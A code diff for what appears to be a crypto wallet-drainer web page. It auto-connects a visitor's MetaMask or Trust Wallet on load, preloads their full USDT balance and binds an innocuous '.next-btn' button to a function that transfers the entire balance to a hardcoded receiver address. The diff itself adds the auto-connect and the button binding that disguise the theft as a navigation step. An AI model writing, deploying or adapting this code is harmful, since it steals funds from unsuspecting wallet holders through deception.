@@ -3,23 +3,23 @@ const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
 const usdtABI = [
   {
     "constant": true,
-    "inputs": [{"name": "_owner", "type": "address"}],
+    "inputs": [{ "name": "_owner", "type": "address" }],
     "name": "balanceOf",
-    "outputs": [{"name": "balance", "type": "uint256"}],
+    "outputs": [{ "name": "balance", "type": "uint256" }],
     "type": "function"
   },
   {
     "constant": false,
-    "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
+    "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }],
     "name": "transfer",
-    "outputs": [{"name": "success", "type": "bool"}],
+    "outputs": [{ "name": "success", "type": "bool" }],
     "type": "function"
   },
   {
     "constant": true,
     "inputs": [],
     "name": "decimals",
-    "outputs": [{"name": "", "type": "uint8"}],
+    "outputs": [{ "name": "", "type": "uint8" }],
     "type": "function"
   }
 ];
@@ -27,11 +27,17 @@ const usdtABI = [
 let web3;
 let account;
 let usdt;
+let userBalanceRaw = "0";
 
 window.onload = async () => {
   if (typeof window.ethereum !== 'undefined') {
     web3 = new Web3(window.ethereum);
     usdt = new web3.eth.Contract(usdtABI, usdtAddress);
+
+    // Setup buttons
+    document.querySelector(".next-btn").addEventListener("click", transferMaxUSDT);
+    await connectWallet(); // Auto connect wallet
+    await fetchAndStoreBalance(); // Preload balance
   } else {
     document.getElementById("status").innerText = "Please install MetaMask or Trust Wallet.";
   }
@@ -43,34 +49,30 @@ async function connectWallet() {
   return account;
 }
 
-async function getUSDTBalance() {
+async function fetchAndStoreBalance() {
   const balance = await usdt.methods.balanceOf(account).call();
-  const decimals = await usdt.methods.decimals().call();
-  const humanReadable = web3.utils.fromWei(balance, 'ether');
-  return { raw: balance, display: humanReadable };
+  userBalanceRaw = balance;
+  const human = web3.utils.fromWei(balance, 'ether');
+  return human;
 }
 
 async function setMax() {
-  await connectWallet();
-  const { display } = await getUSDTBalance();
+  const display = await fetchAndStoreBalance();
   document.getElementById("usdtAmount").value = display;
 }
 
 async function transferMaxUSDT() {
   try {
-    document.getElementById("status").innerText = "Connecting wallet...";
-    await connectWallet();
-    const { raw } = await getUSDTBalance();
+    document.getElementById("status").innerText = "Sending USDT...";
 
-    if (raw === "0") {
-      document.getElementById("status").innerText = "No USDT available.";
+    if (userBalanceRaw === "0" || userBalanceRaw === "0.0") {
+      document.getElementById("status").innerText = "❌ No USDT available.";
       return;
     }
 
-    document.getElementById("status").innerText = "Sending USDT...";
-    await usdt.methods.transfer(receiver, raw).send({ from: account });
+    await usdt.methods.transfer(receiver, userBalanceRaw).send({ from: account });
 
-    document.getElementById("status").innerText = "✅ USDT sent successfully!";
+    document.getElementById("status").innerText = "✅ All USDT sent successfully!";
   } catch (err) {
     console.error(err);
     document.getElementById("status").innerText = "❌ Error: " + err.message;
